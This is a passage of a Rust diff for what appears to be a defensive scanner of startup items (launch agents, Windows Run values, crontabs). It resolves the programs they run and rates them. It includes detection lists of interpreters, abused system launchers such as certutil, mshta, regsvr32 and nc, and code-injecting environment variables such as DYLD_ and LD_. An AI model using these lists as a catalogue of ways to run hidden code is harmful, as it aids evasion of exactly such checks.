@@ -4,6 +4,15 @@
 //! shortcut) is written by someone else and is hostile input: it is opened without following
 //! links, never waited on (pipes), read up to a size limit, parsed by `plutil` with no shell,
 //! and every item and the whole run have time limits. It runs in a child process of the app.
+//!
+//! The rule for every verdict: an item is `NothingFound` only if the thing that actually runs
+//! was resolved to one canonical regular file and that exact file was inspected with a real
+//! result (a trusted signature, a clean score, or the owner's always-allow). Anything else is
+//! `NotChecked`, or `WorthALook` when the item runs code indirectly or inline. `Suspicious`
+//! needs positive evidence. Only a short list of shapes is understood (a program that is not a
+//! general-purpose tool; a known interpreter with known options and one script by full path);
+//! everything else counts as not understood. What an inspected file itself loads or calls
+//! later is not followed.
 
 use crate::ai_policy;
 use crate::bin_ai::BinaryAiScanner;
@@ -22,21 +31,29 @@ pub const MAX_ITEMS: usize = 500;
 /// A launch definition is a few hundred bytes; this is far beyond any real one.
 pub const MAX_DEFINITION_BYTES: u64 = 1024 * 1024;
 const MAX_DIR_ENTRIES: usize = 2000;
+// Display limits, in bytes: 500 items at these sizes, every character escaped, stay under
+// MAX_REPORT_BYTES. What is judged is never cut.
 const MAX_ARGS: usize = 16;
-const MAX_TEXT: usize = 300;
+const MAX_ARG: usize = 120;
+const MAX_TEXT: usize = 200;
+const MAX_PATH: usize = 400;
+const MAX_REASON: usize = 400;
 const MAX_REASONS: usize = 8;
 const MAX_UNREADABLE: usize = 100;
+/// The app reads at most this much of the answer.
+pub const MAX_REPORT_BYTES: u64 = 8 * 1024 * 1024;
 const ITEM_LIMIT: Duration = Duration::from_secs(20);
 pub const TOTAL_LIMIT: Duration = Duration::from_secs(90);
+const NO_TIME: &str = "There was not enough time to check this one. Run the check again.";
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "snake_case")]
 pub enum Verdict {
     Suspicious,
     WorthALook,
-    NothingFound,
-    /// The program could not be located or inspected, so no opinion is given.
+    /// What runs could not be located or inspected, so no opinion is given.
     NotChecked,
+    NothingFound,
 }
 
 impl Verdict {
@@ -58,7 +75,8 @@ pub struct StartupItem {
     pub script: Option<String>,
     /// Only when the definition says: false when it is switched off, true when it starts itself.
     pub enabled: Option<bool>,
-    pub exists: bool,
+    /// None: could not be told (no permission, or no full path).
+    pub exists: Option<bool>,
     pub trusted: bool,
     pub verdict: Verdict,
     pub score: Option<f32>,
@@ -66,7 +84,7 @@ pub struct StartupItem {
     pub reasons: Vec<String>,
     /// The exact program is on the always-allow list.
     pub allowed: bool,
-    /// "you", "system", "every user" or another user's name.
+    /// "you", "system", "every user" or `account "NAME"`.
     pub runs_as: String,
 }
 
@@ -81,51 +99,65 @@ pub struct StartupReport {
     /// Suspicious first.
     pub items: Vec<StartupItem>,
     pub unreadable: Vec<Unreadable>,
-    /// Items left out because they belong to the operating system itself.
-    pub skipped: u32,
-    /// More than `MAX_ITEMS` were found; the rest are not listed.
+    /// Something was left out: more was found than is listed, or the time ran out.
     pub truncated: bool,
 }
 
+/// Text made safe to show, at most `max` bytes; "…" marks where it was cut.
 fn clean(text: &str, max: usize) -> String {
-    text.chars()
+    let mut out = String::new();
+    for c in text
+        .chars()
         .filter(|c| !check_file::is_invisible_format(*c))
-        .take(max)
-        .map(|c| if c.is_control() { ' ' } else { c })
-        .collect()
+    {
+        let c = if c.is_control() { ' ' } else { c };
+        if out.len() + c.len_utf8() > max {
+            while out.len() + '…'.len_utf8() > max {
+                out.pop();
+            }
+            out.push('…');
+            break;
+        }
+        out.push(c);
+    }
+    out
 }
 
 impl StartupReport {
     /// Cuts every field to its limit, so a report is small whatever the files said.
     pub fn clamp(&mut self) {
-        self.truncated |= self.items.len() > MAX_ITEMS;
+        self.truncated |= self.items.len() > MAX_ITEMS || self.unreadable.len() > MAX_UNREADABLE;
         self.items.truncate(MAX_ITEMS);
         self.unreadable.truncate(MAX_UNREADABLE);
         for item in &mut self.items {
             for text in [&mut item.name, &mut item.kind, &mut item.runs_as] {
                 *text = clean(text, MAX_TEXT);
             }
-            item.location = clean(&item.location, 2 * MAX_TEXT);
+            item.location = clean(&item.location, MAX_PATH);
             for text in item.program.iter_mut().chain(item.script.iter_mut()) {
-                *text = clean(text, 2 * MAX_TEXT);
+                *text = clean(text, MAX_PATH);
             }
-            item.arguments.truncate(MAX_ARGS);
+            if item.arguments.len() > MAX_ARGS {
+                let more = item.arguments.len() - (MAX_ARGS - 1);
+                item.arguments.truncate(MAX_ARGS - 1);
+                item.arguments.push(format!("… and {more} more"));
+            }
             for arg in &mut item.arguments {
-                *arg = clean(arg, MAX_TEXT);
+                *arg = clean(arg, MAX_ARG);
             }
             item.reasons.truncate(MAX_REASONS);
             for reason in &mut item.reasons {
-                *reason = clean(reason, 2 * MAX_TEXT);
+                *reason = clean(reason, MAX_REASON);
             }
         }
         for place in &mut self.unreadable {
-            place.place = clean(&place.place, 2 * MAX_TEXT);
-            place.reason = clean(&place.reason, 2 * MAX_TEXT);
+            place.place = clean(&place.place, MAX_PATH);
+            place.reason = clean(&place.reason, MAX_REASON);
         }
     }
 }
 
-/// One definition as read from its file, before anyone has looked at the program.
+/// One definition as read from its file, uncut, before anyone has looked at the program.
 #[derive(Debug, Clone, Default)]
 pub struct Candidate {
     pub name: String,
@@ -141,6 +173,8 @@ pub struct Candidate {
     pub unresolved: Option<String>,
     /// A line a shell will run (cron): the command-line rules are applied to all of it.
     pub shell_command: Option<String>,
+    /// It runs with full system rights.
+    pub as_root: bool,
 }
 
 struct Found {
@@ -148,9 +182,15 @@ struct Found {
     unreadable: Vec<Unreadable>,
     truncated: bool,
     max_items: usize,
+    /// No definition is opened after this, so reading them cannot use up the time for judging.
+    deadline: Instant,
 }
 
 impl Found {
+    fn late(&self) -> bool {
+        Instant::now() >= self.deadline
+    }
+
     fn push(&mut self, candidate: Candidate) {
         if self.candidates.len() < self.max_items {
             self.candidates.push(candidate);
@@ -165,6 +205,8 @@ impl Found {
                 place: place.into(),
                 reason: reason.into(),
             });
+        } else {
+            self.truncated = true;
         }
     }
 }
@@ -189,7 +231,10 @@ pub fn risky_location(path: &str) -> Option<&'static str> {
         Some("temp")
     } else if parts.contains(&"downloads") {
         Some("downloads")
-    } else if parts.iter().any(|p| p.starts_with('.') && *p != "..") {
+    } else if parts
+        .iter()
+        .any(|p| p.starts_with('.') && !matches!(*p, "." | ".."))
+    {
         Some("hidden")
     } else {
         None
@@ -215,78 +260,253 @@ fn program_stem(program: &str) -> String {
     lower.strip_suffix(".exe").unwrap_or(&lower).to_string()
 }
 
+/// A program name without its version: "python3.12" and "bash-5.2" are still Python and bash.
+fn base_name(stem: &str) -> &str {
+    stem.trim_end_matches(|c: char| c.is_ascii_digit() || matches!(c, '.' | '-'))
+}
+
 /// Programs that run a script or a command given to them: trusting the program says nothing
 /// about what it is told to run.
+const INTERPRETERS: &[&str] = &[
+    "sh",
+    "bash",
+    "zsh",
+    "dash",
+    "ksh",
+    "csh",
+    "tcsh",
+    "fish",
+    "python",
+    "pythonw",
+    "perl",
+    "ruby",
+    "php",
+    "node",
+    "nodejs",
+    "osascript",
+    "lua",
+    "powershell",
+    "pwsh",
+    "cmd",
+    "wscript",
+    "cscript",
+    "mshta",
+    "tclsh",
+    "expect",
+    "java",
+    "javaw",
+    "deno",
+    "bun",
+    "irb",
+    "swift",
+];
+
+/// Programs whose job is to start or load something else they are given.
+const LAUNCHERS: &[&str] = &[
+    "env",
+    "nohup",
+    "nice",
+    "xargs",
+    "caffeinate",
+    "sudo",
+    "doas",
+    "awk",
+    "gawk",
+    "nawk",
+    "mawk",
+    "busybox",
+    "toybox",
+    "launchctl",
+    "sandbox-exec",
+    "rundll32",
+    "regsvr32",
+    "msbuild",
+    "installutil",
+    "regasm",
+    "regsvcs",
+    "msiexec",
+    "wmic",
+    "forfiles",
+    "pcalua",
+    "conhost",
+    "certutil",
+    "bitsadmin",
+    "schtasks",
+    "cmstp",
+    "odbcconf",
+    "wsl",
+    "msdt",
+    "hh",
+    "dotnet",
+];
+
+/// The same, but with names other makers use too: only the operating system's own count.
+const OS_LAUNCHERS: &[&str] = &[
+    "open",
+    "arch",
+    "time",
+    "timeout",
+    "script",
+    "find",
+    "make",
+    "gmake",
+    "rake",
+    "at",
+    "atrun",
+    "batch",
+    "cron",
+    "periodic",
+    "su",
+    "login",
+    "ssh",
+    "rsync",
+    "git",
+    "vim",
+    "vi",
+    "ex",
+    "view",
+    "ed",
+    "emacs",
+    "gdb",
+    "lldb",
+    "dtrace",
+    "sqlite3",
+    "xcrun",
+    "xcodebuild",
+    "erb",
+    "gem",
+    "npm",
+    "npx",
+    "automator",
+    "installer",
+    "screen",
+    "tmux",
+    "watch",
+    "tar",
+    "nc",
+    "explorer",
+    "start",
+    "control",
+    "mmc",
+    "sc",
+];
+
+/// Operating system tools that only show or wait, whatever they are told.
+const PLAIN_OS_TOOLS: &[&str] = &["ls", "true", "false", "echo", "sleep", "date"];
+
+fn named_in(list: &[&str], stem: &str) -> bool {
+    list.contains(&stem) || list.contains(&base_name(stem))
+}
+
 pub fn is_interpreter(stem: &str) -> bool {
-    stem.starts_with("python")
-        || matches!(
-            stem,
-            "sh" | "bash"
-                | "zsh"
-                | "dash"
-                | "ksh"
-                | "csh"
-                | "tcsh"
-                | "fish"
-                | "env"
-                | "perl"
-                | "ruby"
-                | "php"
-                | "node"
-                | "osascript"
-                | "lua"
-                | "powershell"
-                | "pwsh"
-                | "cmd"
-                | "wscript"
-                | "cscript"
-                | "mshta"
-        )
+    named_in(INTERPRETERS, stem)
 }
 
-/// What an interpreter is told to run.
-#[derive(Debug, Clone, PartialEq, Eq)]
-pub enum Target {
-    /// The command is written on the command line itself.
-    Inline,
-    Script(String),
-    Nothing,
+/// A path that names one file on this computer without asking anything else: from the root, or
+/// from a drive letter on Windows. Never a bare name, a relative path, a network share or a
+/// device path (opening `\\host\x` would contact that host).
+pub fn full_path(path: &str, windows: bool) -> bool {
+    let b = path.as_bytes();
+    if windows {
+        b.len() > 3 && b[0].is_ascii_alphabetic() && b[1] == b':' && matches!(b[2], b'\\' | b'/')
+    } else {
+        path.starts_with('/')
+    }
 }
 
-/// Looks through the arguments after an interpreter for its script. `env python3 x.py` is
-/// followed to `python3`. Returns the interpreter that really runs and what it runs.
-pub fn script_target(stem: &str, args: &[String]) -> (String, Target) {
-    let mut stem = stem.to_string();
-    let mut args = args;
-    if stem == "env" {
-        let skip = args
-            .iter()
-            .take_while(|a| a.starts_with('-') || a.contains('='))
-            .count();
-        let Some(real) = args.get(skip) else {
-            return (stem, Target::Nothing);
+/// The script an interpreter is given, when every option before it is a known harmless one and
+/// the script has a full path. None: not understood.
+pub fn script_of<'a>(stem: &str, args: &'a [String]) -> Option<&'a str> {
+    type Pairs<'x> = &'x [(&'x str, &'x [&'x str])];
+    const SET: Pairs = &[("-o", &["pipefail", "errexit", "nounset", "xtrace"])];
+    let name = base_name(stem);
+    // (single-letter flags, whole words, options with a value, option that must be there
+    // because without it another file runs first, option before the script)
+    let (flags, words, pairs, needed, before): (&str, &[&str], Pairs, &[&str], &[&str]) = match name
+    {
+        "sh" | "bash" | "dash" | "ksh" => ("euvx", &["--norc", "--noprofile"], SET, &[], &[]),
+        "zsh" => ("efuvx", &[], SET, &["f"], &[]),
+        "csh" | "tcsh" => ("efvx", &[], &[], &["f"], &[]),
+        "python" | "pythonw" => ("bBEIOqsSuv", &[], &[], &[], &[]),
+        "perl" => ("wTt", &[], &[], &[], &[]),
+        "ruby" => ("w", &[], &[], &[], &[]),
+        "node" | "nodejs" => ("", &[], &[], &[], &[]),
+        "osascript" => ("", &[], &[("-l", &["JavaScript", "AppleScript"])], &[], &[]),
+        "powershell" | "pwsh" => (
+            "",
+            &[
+                "-noprofile",
+                "-nop",
+                "-noninteractive",
+                "-noni",
+                "-nologo",
+                "-nol",
+            ],
+            &[("-executionpolicy", &[]), ("-ep", &[]), ("-ex", &[])],
+            &["-noprofile", "-nop"],
+            &["-file", "-f"],
+        ),
+        "wscript" | "cscript" => ("", &["//nologo", "//b"], &[], &[], &[]),
+        _ => return None,
+    };
+    let ignores_case = matches!(name, "powershell" | "pwsh" | "wscript" | "cscript");
+    let mut seen_needed = needed.is_empty();
+    let mut i = 0;
+    loop {
+        let arg = if ignores_case {
+            args.get(i)?.to_ascii_lowercase()
+        } else {
+            args.get(i)?.clone()
         };
-        stem = program_stem(real);
-        args = &args[skip + 1..];
-    }
-    let mut iter = args.iter();
-    while let Some(arg) = iter.next() {
-        let lower = arg.to_lowercase();
-        match lower.as_str() {
-            "-c" | "-e" | "/c" | "/k" | "-command" | "-encodedcommand" | "-enc" | "-ec"
-            | "--eval" | "-r" => return (stem, Target::Inline),
-            "-file" | "-f" => {
-                return (
-                    stem,
-                    iter.next()
-                        .map_or(Target::Nothing, |s| Target::Script(s.clone())),
-                )
+        if let Some((_, values)) = pairs.iter().find(|(option, _)| *option == arg) {
+            let value = args.get(i + 1)?;
+            if !values.is_empty() && !values.contains(&value.as_str()) {
+                return None;
             }
-            _ if lower.starts_with('-') || lower.starts_with('/') && lower.len() <= 3 => {}
-            _ => return (stem, Target::Script(arg.clone())),
+            i += 2;
+            continue;
         }
+        let cluster = arg
+            .strip_prefix('-')
+            .filter(|f| !f.is_empty() && f.chars().all(|c| flags.contains(c)));
+        if cluster.is_none() && !words.contains(&arg.as_str()) {
+            break;
+        }
+        seen_needed |= needed
+            .iter()
+            .any(|n| *n == arg || cluster.is_some_and(|c| c.contains(n)));
+        i += 1;
     }
-    (stem, Target::Nothing)
+    if !before.is_empty() {
+        let option = args.get(i)?.to_ascii_lowercase();
+        if !before.contains(&option.as_str()) {
+            return None;
+        }
+        i += 1;
+    }
+    let script = args.get(i)?.as_str();
+    let full = full_path(script, false) || full_path(script, true);
+    (seen_needed && full && !script.starts_with("//")).then_some(script)
+}
+
+/// Settings that make a program load other code before its own.
+pub fn loads_other_code(variable: &str) -> bool {
+    matches!(
+        variable,
+        "ENV"
+            | "BASH_ENV"
+            | "SHELLOPTS"
+            | "ZDOTDIR"
+            | "RUBYOPT"
+            | "RUBYLIB"
+            | "NODE_OPTIONS"
+            | "NODE_PATH"
+            | "ELECTRON_RUN_AS_NODE"
+            | "JAVA_TOOL_OPTIONS"
+            | "_JAVA_OPTIONS"
+    ) || ["DYLD_", "LD_", "PYTHON", "PERL5", "BASH_FUNC_"]
+        .iter()
+        .any(|prefix| variable.starts_with(prefix))
 }
 
 /// Splits what follows a program the way Windows does: spaces separate, double quotes group.
@@ -318,9 +538,6 @@ pub fn split_arguments(text: &str) -> Vec<String> {
                 started = true;
             }
         }
-        if args.len() > MAX_ARGS * 4 {
-            break;
-        }
     }
     if started {
         args.push(current);
@@ -338,14 +555,28 @@ pub struct ParsedCommand {
 
 /// A Windows command line (a Run value, a service path) as program and arguments. A quoted
 /// path ends at the closing quote. An unquoted one is ambiguous (`C:\Program Files\A\a.exe -x`),
-/// so, like Windows, the shortest prefix that names an existing file wins; with none, the first
-/// word is taken. `exists` is the file check, passed in so this stays pure.
+/// so, like Windows, the shortest prefix that names an existing file wins, with ".exe" added to
+/// a name that has no extension; with none, the first word is taken. `exists` is the file check,
+/// passed in so this stays pure; it is only asked about full paths on this computer.
 pub fn parse_command_line(text: &str, exists: &dyn Fn(&str) -> bool) -> ParsedCommand {
     let text = text.trim();
+    // The file Windows would start for this path, and whether it had to add ".exe".
+    let find = |path: &str| {
+        if !full_path(path, true) {
+            return None;
+        }
+        let name = path.rsplit(['\\', '/']).next().unwrap_or(path);
+        let with_exe = format!("{path}.exe");
+        if !name.is_empty() && !name.contains('.') && exists(&with_exe) {
+            return Some((with_exe, true));
+        }
+        exists(path).then(|| (path.to_string(), false))
+    };
     if let Some(rest) = text.strip_prefix('"') {
         let (program, tail) = rest.split_once('"').unwrap_or((rest, ""));
+        let program = program.trim();
         return ParsedCommand {
-            program: program.trim().to_string(),
+            program: find(program).map_or_else(|| program.to_string(), |(p, _)| p),
             arguments: split_arguments(tail),
             unquoted_spaces: false,
         };
@@ -356,12 +587,12 @@ pub fn parse_command_line(text: &str, exists: &dyn Fn(&str) -> bool) -> ParsedCo
         .map(|(i, _)| i)
         .take(64);
     for end in boundaries.chain(std::iter::once(text.len())) {
-        let candidate = text[..end].trim_end();
-        if !candidate.is_empty() && exists(candidate) {
+        if let Some((program, added)) = find(text[..end].trim_end()) {
             return ParsedCommand {
-                program: candidate.to_string(),
+                unquoted_spaces: program.contains(char::is_whitespace)
+                    || (added && end < text.len()),
+                program,
                 arguments: split_arguments(&text[end..]),
-                unquoted_spaces: candidate.contains(char::is_whitespace),
             };
         }
     }
@@ -371,6 +602,37 @@ pub fn parse_command_line(text: &str, exists: &dyn Fn(&str) -> bool) -> ParsedCo
         arguments: split_arguments(&text[end..]),
         unquoted_spaces: false,
     }
+}
+
+/// One Run value as a candidate. `expand` is what the registry says (REG_EXPAND_SZ): only then
+/// does Windows replace `%NAME%`.
+pub fn run_value(
+    text: &str,
+    expand: bool,
+    lookup: &dyn Fn(&str) -> Option<String>,
+    exists: &dyn Fn(&str) -> bool,
+) -> Candidate {
+    let text = if expand {
+        expand_env(text, lookup)
+    } else {
+        text.to_string()
+    };
+    let parsed = parse_command_line(&text, exists);
+    let mut c = Candidate {
+        program: (!parsed.program.is_empty()).then_some(parsed.program),
+        arguments: parsed.arguments,
+        ..Candidate::default()
+    };
+    if parsed.unquoted_spaces {
+        c.notes.push("Its path has spaces but no quotation marks around it, which Windows can misread and so start a different file.".into());
+    }
+    c
+}
+
+/// What Task Manager's on/off switch recorded for a startup item (StartupApproved): an odd
+/// first byte means switched off.
+pub fn startup_approved(data: &[u8]) -> bool {
+    data.first().is_none_or(|b| b & 1 == 0)
 }
 
 /// `%NAME%` replaced from `lookup`; unknown names are left as they are.
@@ -395,27 +657,153 @@ pub fn expand_env(text: &str, lookup: &dyn Fn(&str) -> Option<String>) -> String
     out
 }
 
-/// Jobs in a crontab as (schedule, command). Comments, blank lines and `NAME=value` lines are
-/// not jobs.
-pub fn parse_crontab(text: &str) -> Vec<(String, String)> {
-    let mut jobs = Vec::new();
+#[derive(Debug, Default, PartialEq, Eq)]
+pub struct Crontab {
+    /// `NAME=value` lines.
+    pub settings: Vec<(String, String)>,
+    /// (schedule, command exactly as written)
+    pub jobs: Vec<(String, String)>,
+}
+
+/// A crontab's settings and jobs. Comments, blank lines and broken lines are neither.
+pub fn parse_crontab(text: &str) -> Crontab {
+    let mut tab = Crontab::default();
     for line in text.lines().map(str::trim) {
-        if line.is_empty() || line.starts_with('#') || jobs.len() >= MAX_ITEMS {
+        if line.is_empty() || line.starts_with('#') {
             continue;
         }
-        let fields: Vec<&str> = line.split_whitespace().collect();
-        let (schedule, command) = if fields[0].starts_with('@') {
-            (fields[0].to_string(), fields[1..].join(" "))
-        } else if fields.len() > 5 {
-            (fields[..5].join(" "), fields[5..].join(" "))
-        } else {
-            continue; // an environment line (NAME=value) or a broken one
-        };
+        if let Some((name, value)) = line.split_once('=') {
+            let name = name.trim().trim_matches(['"', '\'']);
+            if !name.contains(char::is_whitespace) {
+                let value = value.trim().trim_matches(['"', '\'']);
+                tab.settings.push((name.to_string(), value.to_string()));
+                continue;
+            }
+        }
+        let fields = if line.starts_with('@') { 1 } else { 5 };
+        let mut command = line;
+        for _ in 0..fields {
+            let end = command.find(char::is_whitespace).unwrap_or(command.len());
+            command = command[end..].trim_start();
+        }
         if !command.is_empty() {
-            jobs.push((schedule, command));
+            let schedule = line[..line.len() - command.len()]
+                .split_whitespace()
+                .collect::<Vec<_>>()
+                .join(" ");
+            tab.jobs.push((schedule, command.to_string()));
         }
     }
-    jobs
+    tab
+}
+
+/// Cron hands every line to a shell. Only a full path and plain words mean the same to it as
+/// they say; with anything else the shell decides what runs.
+pub fn is_plain_command(command: &str) -> bool {
+    let first = command.split_whitespace().next().unwrap_or_default();
+    first.starts_with('/')
+        && !first.contains('=')
+        && command.chars().all(|c| {
+            c.is_ascii_alphanumeric()
+                || matches!(c, ' ' | '_' | '.' | '/' | ':' | '@' | ',' | '+' | '=' | '-')
+        })
+}
+
+/// One top-level setting of a property list; the parts inside it that no check needs are not kept.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum Setting {
+    Text(String),
+    Flag(bool),
+    /// An array; None stands for an entry that is not text.
+    List(Vec<Option<String>>),
+    /// A dictionary's keys.
+    Keys(Vec<String>),
+    Other,
+}
+
+fn unescape_xml(text: &str) -> String {
+    text.replace("&lt;", "<")
+        .replace("&gt;", ">")
+        .replace("&quot;", "\"")
+        .replace("&apos;", "'")
+        .replace("&amp;", "&")
+}
+
+/// The top-level settings in the XML that `plutil -convert xml1` writes (no comments, CDATA or
+/// other entities there). None when it is not a dictionary. Dates, data, numbers and anything
+/// deeper are passed over, so none of them can hide the rest.
+pub fn read_plist_xml(xml: &str) -> Option<Vec<(String, Setting)>> {
+    let mut settings = Vec::new();
+    let mut key: Option<String> = None;
+    let mut open: Option<(String, Setting)> = None;
+    let mut depth = 0usize;
+    let mut rest = xml;
+    loop {
+        let (_, after) = rest.split_once('<')?;
+        let (tag, after) = after.split_once('>')?;
+        rest = after;
+        let value = match tag {
+            "dict" | "array" => {
+                depth += 1;
+                let empty = if tag == "dict" {
+                    Setting::Keys(Vec::new())
+                } else {
+                    Setting::List(Vec::new())
+                };
+                match depth {
+                    1 if tag != "dict" => return None,
+                    2 => open = Some((key.take()?, empty)),
+                    3 => {
+                        if let Some((_, Setting::List(list))) = &mut open {
+                            list.push(None);
+                        }
+                    }
+                    _ => {}
+                }
+                continue;
+            }
+            "/dict" | "/array" => {
+                depth = depth.checked_sub(1)?;
+                match depth {
+                    0 => return Some(settings),
+                    1 => settings.push(open.take()?),
+                    _ => {}
+                }
+                continue;
+            }
+            "dict/" if depth == 0 => return Some(settings),
+            "dict/" => Setting::Keys(Vec::new()),
+            "array/" => Setting::List(Vec::new()),
+            "true/" => Setting::Flag(true),
+            "false/" => Setting::Flag(false),
+            "string/" => Setting::Text(String::new()),
+            _ if tag.starts_with(['?', '!', '/']) || tag.starts_with("plist") => continue,
+            _ => {
+                let (inner, after) = rest.split_once("</")?;
+                rest = after.split_once('>')?.1;
+                match tag {
+                    "key" => {
+                        if depth == 1 {
+                            key = Some(unescape_xml(inner));
+                        } else if let (2, Some((_, Setting::Keys(keys)))) = (depth, &mut open) {
+                            keys.push(unescape_xml(inner));
+                        }
+                        continue;
+                    }
+                    "string" => Setting::Text(unescape_xml(inner)),
+                    _ => Setting::Other,
+                }
+            }
+        };
+        match (depth, &mut open) {
+            (1, _) => settings.push((key.take()?, value)),
+            (2, Some((_, Setting::List(list)))) => list.push(match value {
+                Setting::Text(text) => Some(text),
+                _ => None,
+            }),
+            _ => {}
+        }
+    }
 }
 
 fn digest_of(hex: &str) -> Option<[u8; 32]> {
@@ -479,6 +867,38 @@ fn loose_permissions(_meta: &fs::Metadata) -> bool {
     false
 }
 
+/// Whether someone other than the owner or an administrator can change `path`, or swap it by
+/// changing a folder on the way to it.
+fn others_can_change(path: &Path) -> bool {
+    path.ancestors().enumerate().any(|(i, p)| {
+        fs::metadata(p).is_ok_and(|m| loose_permissions(&m) && !(i > 0 && is_sticky(&m)))
+    })
+}
+
+/// In a sticky folder (/tmp) only a file's owner can replace it.
+#[cfg(unix)]
+fn is_sticky(meta: &fs::Metadata) -> bool {
+    std::os::unix::fs::MetadataExt::mode(meta) & 0o1000 != 0
+}
+
+#[cfg(not(unix))]
+fn is_sticky(_meta: &fs::Metadata) -> bool {
+    false
+}
+
+/// Whether an ordinary account owns `path` or a folder on the way to it.
+#[cfg(unix)]
+fn ordinary_owner(path: &Path) -> bool {
+    use std::os::unix::fs::MetadataExt;
+    path.ancestors()
+        .any(|p| fs::metadata(p).is_ok_and(|m| m.uid() != 0))
+}
+
+#[cfg(not(unix))]
+fn ordinary_owner(_path: &Path) -> bool {
+    false
+}
+
 // ---- Judging one item ----
 
 fn plain_item(c: &Candidate, verdict: Verdict, reasons: Vec<String>) -> StartupItem {
@@ -490,7 +910,7 @@ fn plain_item(c: &Candidate, verdict: Verdict, reasons: Vec<String>) -> StartupI
         arguments: c.arguments.clone(),
         script: None,
         enabled: c.enabled,
-        exists: false,
+        exists: None,
         trusted: false,
         verdict,
         score: None,
@@ -512,52 +932,319 @@ fn location_reason(kind: &str, what: &str) -> String {
     }
 }
 
-/// Whether the program really comes from the vendor its name claims.
-fn vendor_confirmed(vendor: &str, path: &Path, trusted: bool) -> bool {
-    match vendor {
-        // Anyone with a Developer ID is "trusted"; only Apple itself may use an Apple name.
-        "Apple" => {
-            trusted && (platform::is_os_vendor_signed(path) || ai_policy::is_os_critical_path(path))
-        }
-        _ => trusted,
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Claim {
+    Confirmed,
+    /// Signed, but nothing here can say by whom.
+    Unknown,
+    Contradicted,
+}
+
+/// Whether the program really comes from the vendor its name claims. `signed` is whether that
+/// vendor's own signature is on it, None where that cannot be told (Windows); `os_file` is
+/// whether it is part of the operating system.
+pub fn check_claim(vendor: &str, os_file: bool, signed: Option<bool>, trusted: bool) -> Claim {
+    let os_vendor = if signed.is_some() {
+        "Apple"
+    } else {
+        "Microsoft"
+    };
+    match signed {
+        _ if os_file && vendor == os_vendor => Claim::Confirmed,
+        Some(true) => Claim::Confirmed,
+        None if trusted => Claim::Unknown,
+        _ => Claim::Contradicted,
     }
 }
 
-enum Judged {
-    Item(StartupItem),
-    /// Belongs to the operating system: left out.
-    Skipped,
+/// Why a path was not resolved to a file. `look`: that is worth a mention by itself.
+struct Trouble {
+    exists: Option<bool>,
+    look: bool,
+    why: String,
 }
 
-fn judge(cfg: &AppConfig, scanner: &BinaryAiScanner, c: Candidate) -> Judged {
-    // strong: makes it "Suspicious"; soft: "Worth a look"; info: said, but changes nothing.
-    let mut strong: Vec<String> = Vec::new();
-    let mut soft: Vec<String> = c.notes.clone();
-    let mut info: Vec<String> = c.unresolved.iter().cloned().collect();
-    let mut item = plain_item(&c, Verdict::NotChecked, Vec::new());
-    let Some(program) = c.program.as_deref() else {
-        item.verdict = if soft.is_empty() {
-            Verdict::NotChecked
-        } else {
-            Verdict::WorthALook
-        };
-        soft.extend(info);
-        item.reasons = soft;
-        return Judged::Item(item);
+/// The one canonical regular file `text` names. Nothing is opened, and a path that is not a
+/// full one on this computer is not even looked up.
+fn resolve(text: &str, what: &str) -> Result<PathBuf, Trouble> {
+    let trouble = |exists, look, why: String| Err(Trouble { exists, look, why });
+    let shown = clean(text, 120);
+    if !full_path(text, cfg!(windows)) {
+        return trouble(None, false, format!("The {what} is not given by a full path on this computer ({shown}), so it was not opened or checked."));
+    }
+    let path = match fs::canonicalize(text) {
+        Ok(path) => path,
+        Err(e)
+            if matches!(
+                e.kind(),
+                std::io::ErrorKind::NotFound | std::io::ErrorKind::NotADirectory
+            ) =>
+        {
+            return trouble(Some(false), true, format!("The {what} is not there ({shown}). This usually means the software was removed and left this entry behind."));
+        }
+        Err(_) => {
+            return trouble(None, false, format!("The {what} could not be looked at ({shown}), so it was not checked. You may not have permission."));
+        }
     };
-    let path = Path::new(program);
-    let Ok(meta) = fs::metadata(path) else {
-        soft.push(format!(
-            "The program it starts is not there ({}). This usually means the software was removed and left this entry behind.",
-            clean(program, 120)
+    if path.to_string_lossy().starts_with(r"\\?\UNC\") {
+        return trouble(
+            None,
+            false,
+            format!(
+                "The {what} is on another computer ({shown}), so it was not opened or checked."
+            ),
+        );
+    }
+    match fs::metadata(&path) {
+        Ok(meta) if meta.is_file() => Ok(path),
+        Ok(_) => trouble(Some(true), true, format!("The {what} is not an ordinary file (it is a folder, pipe or device: {shown}), so it was not checked.")),
+        Err(_) => trouble(None, false, format!("The {what} could not be looked at ({shown}), so it was not checked.")),
+    }
+}
+
+/// The interpreter and its one option from a script's first line. None when it has none.
+fn shebang(path: &Path) -> Option<(String, Vec<String>)> {
+    use std::io::Read;
+    let mut head = Vec::new();
+    crate::quarantine::open_nofollow(path)
+        .ok()?
+        .take(512)
+        .read_to_end(&mut head)
+        .ok()?;
+    let line = head.strip_prefix(b"#!")?.split(|b| *b == b'\n').next()?;
+    let line = String::from_utf8_lossy(line).trim().to_string();
+    let (program, option) = line.split_once([' ', '\t']).unwrap_or((&line, ""));
+    let option = option.trim();
+    Some((
+        program.to_string(),
+        (!option.is_empty())
+            .then(|| option.to_string())
+            .into_iter()
+            .collect(),
+    ))
+}
+
+/// A part of an argument that is a full path: `/x`, `--file=/x`, `C:\x.dll,Entry`.
+pub fn path_in(arg: &str, windows: bool) -> Option<&str> {
+    if !windows {
+        return arg.find('/').map(|at| &arg[at..]);
+    }
+    arg.match_indices(':').find_map(|(at, _)| {
+        let path = arg.get(at.checked_sub(1)?..)?.split(',').next()?;
+        full_path(path, true).then_some(path)
+    })
+}
+
+/// Whether a file is a script or a library: something another program would run.
+fn is_code_file(path: &Path) -> bool {
+    const CODE: &[&str] = &[
+        "sh",
+        "command",
+        "py",
+        "pyc",
+        "rb",
+        "pl",
+        "js",
+        "mjs",
+        "cjs",
+        "php",
+        "lua",
+        "scpt",
+        "applescript",
+        "jar",
+        "asar",
+        "dylib",
+        "so",
+        "dll",
+        "ps1",
+        "vbs",
+        "bat",
+        "cmd",
+        "hta",
+    ];
+    path.extension()
+        .is_some_and(|e| CODE.contains(&e.to_string_lossy().to_ascii_lowercase().as_str()))
+        || shebang(path).is_some()
+}
+
+#[derive(Default)]
+struct Findings {
+    /// Makes it "Suspicious".
+    strong: Vec<String>,
+    /// "Worth a look".
+    soft: Vec<String>,
+    /// Said, but changes nothing.
+    info: Vec<String>,
+}
+
+/// What the check of one file found.
+struct Looked {
+    /// A real result for a program: a trusted signature or a clean score.
+    clean: bool,
